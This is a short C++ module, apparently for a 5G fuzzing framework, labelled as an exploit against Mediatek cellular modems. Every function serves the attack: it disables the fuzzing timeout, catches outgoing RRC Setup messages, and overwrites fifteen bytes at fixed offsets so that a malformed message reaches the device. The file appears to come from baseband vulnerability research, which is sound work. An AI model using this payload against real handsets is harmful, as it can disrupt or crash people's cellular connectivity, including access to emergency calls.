#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[719 - 48] = 0x47;
        pkt_buf[720 - 48] = 0x0e;
        pkt_buf[721 - 48] = 0x30;
        pkt_buf[722 - 48] = 0x47;
        pkt_buf[723 - 48] = 0x18;
        pkt_buf[724 - 48] = 0xfc;
        pkt_buf[725 - 48] = 0x0d;
        pkt_buf[726 - 48] = 0x10;
        pkt_buf[727 - 48] = 0x01;
        pkt_buf[728 - 48] = 0xa0;
        pkt_buf[729 - 48] = 0xc8;
        pkt_buf[730 - 48] = 0x08;
        pkt_buf[731 - 48] = 0x18;
        pkt_buf[732 - 48] = 0x2a;
        pkt_buf[733 - 48] = 0x60;
        return 1;
    }
    return 0;
}
